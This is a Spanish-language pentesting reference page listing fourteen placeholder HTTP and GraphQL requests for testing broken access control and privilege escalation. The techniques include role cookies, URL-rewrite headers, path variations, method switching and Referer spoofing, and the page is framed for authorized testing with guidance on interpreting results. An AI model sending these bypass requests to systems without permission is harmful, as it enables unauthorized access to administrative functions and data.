# 🗡️ Control de acceso roto y elevación de privilegios: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. Función oculta en la UI

**Objetivo:** Pedir directamente una ruta de lectura administrativa descubierta en el tráfico propio.

```http
GET /api/admin/settings HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
```

**Interpretación:** La ausencia de un enlace no protege la ruta. Confirmar contenido reservado, no un 200 genérico.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/access-control).

### 2. Sin sesión en ruta privilegiada

**Objetivo:** Repetir la misma función observada sin credenciales.

```http
GET /api/admin/settings HTTP/1.1
Host: {ORIGEN}
Accept: application/json
```

**Interpretación:** Separar autenticación ausente de fallo de rol. Un shell público de SPA no equivale a datos administrativos.

**Fuente técnica:** [documentación de la técnica](https://api-security.owasp.org/editions/2023/en/0xa5-broken-function-level-authorization/).

### 3. Rol aportado por cookie

**Objetivo:** Si el cliente envía una cookie de rol no firmada, cambiarla bajo la cuenta de bajo privilegio.

```http
GET /api/admin/settings HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_ROL_BAJO}; role=admin
```

**Interpretación:** Probar solo si la cookie existe en el flujo real; el servidor no debe basar la política en ese valor manipulable.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/access-control).

### 4. Rol aportado por query

**Objetivo:** Si la app usa parámetros de vista o rol, comprobar que no sustituyen el rol de servidor.

```http
GET /api/account?admin=true&role=admin HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_ROL_BAJO}
```

**Interpretación:** Comparar una acción reservada real; que cambie la apariencia del frontend no prueba elevación.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/access-control).

### 5. X-Original-URL

**Objetivo:** Comparar la política del proxy sobre / con la ruta interna de lectura privilegiada.

```http
GET / HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
X-Original-URL: /api/admin/settings
```

**Interpretación:** El riesgo existe si el backend sirve settings mientras la capa frontal autorizó solo /. Probar también sin el header.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/access-control).

### 6. X-Rewrite-URL

**Objetivo:** Repetir la divergencia de ruta con el segundo header de reescritura documentado.

```http
GET / HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
X-Rewrite-URL: /api/admin/settings
```

**Interpretación:** Una redirección o respuesta de / no basta; verificar que se ejecutó la ruta protegida real.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/access-control).

### 7. Cambio de método HTTP

**Objetivo:** En una función propia y reversible, comparar la autorización de POST y GET si ambos son aceptados.

```http
GET /api/admin/preview-report?report_id={REPORTE_PROPIO} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
```

**Interpretación:** Usar una operación real de lectura o vista previa. El bypass requiere que un método alternativo alcance la misma función protegida.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/access-control).

### 8. Mayúsculas en ruta

**Objetivo:** Cambiar solo la capitalización de una ruta privilegiada conocida.

```http
GET /API/ADMIN/SETTINGS HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
```

**Interpretación:** Comparar resolución del backend y decisión de autorización. Si devuelve otra ruta o 404, no hay bypass.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/access-control).

### 9. Barra final de ruta

**Objetivo:** Comparar la misma función con y sin barra final.

```http
GET /api/admin/settings/ HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
```

**Interpretación:** La discrepancia importa cuando ambas variantes ejecutan la misma función pero una omite el control.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/access-control).

### 10. Sufijo en ruta

**Objetivo:** En frameworks que admiten sufijos de ruta, probar una extensión inocua en función de lectura.

```http
GET /api/admin/settings.json HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
```

**Interpretación:** Aplica solo si el router resuelve el sufijo a la misma acción. No interpretar un archivo estático como bypass.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/access-control).

### 11. Paso final de flujo

**Objetivo:** En un borrador propio, invocar el paso final sin completar la revisión autorizada previa.

```http
POST /api/drafts/{BORRADOR_PROPIO}/confirm HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
Content-Type: application/json

{"confirmation":"{MARCADOR_PROPIO}"}
```

**Interpretación:** Usar un flujo reversible de laboratorio. Confirmar estado persistido y que faltaba una condición de autorización.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/access-control).

### 12. Referer como supuesta autorización

**Objetivo:** En una subruta de lectura restringida, comparar con un Referer administrativo simulado.

```http
GET /api/admin/reports/{REPORTE_PROPIO}/preview HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
Referer: https://{ORIGEN}/admin
```

**Interpretación:** Referer es controlable y no acredita rol. Solo hay fallo si se devuelve contenido o función antes denegada.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/access-control).

### 13. Versión API alternativa

**Objetivo:** Comparar la misma función en dos versiones que el producto mantenga activas.

```http
GET /api/v1/admin/settings HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
```

**Interpretación:** Usar únicamente versiones descubiertas en la app. Verificar equivalencia funcional con la versión protegida.

**Fuente técnica:** [documentación de la técnica](https://api-security.owasp.org/editions/2023/en/0xa5-broken-function-level-authorization/).

### 14. Mutación GraphQL de rol alto

**Objetivo:** Invocar con rol bajo una mutación real de laboratorio diseñada para rol alto.

```graphql
mutation VistaPrevia { adminPreviewReport(id: "{REPORTE_PROPIO}") { id status } }
```

**Interpretación:** El resolver debe aplicar política aunque la UI o la introspección escondan la operación; confirmar resultado efectivo.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/graphql).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
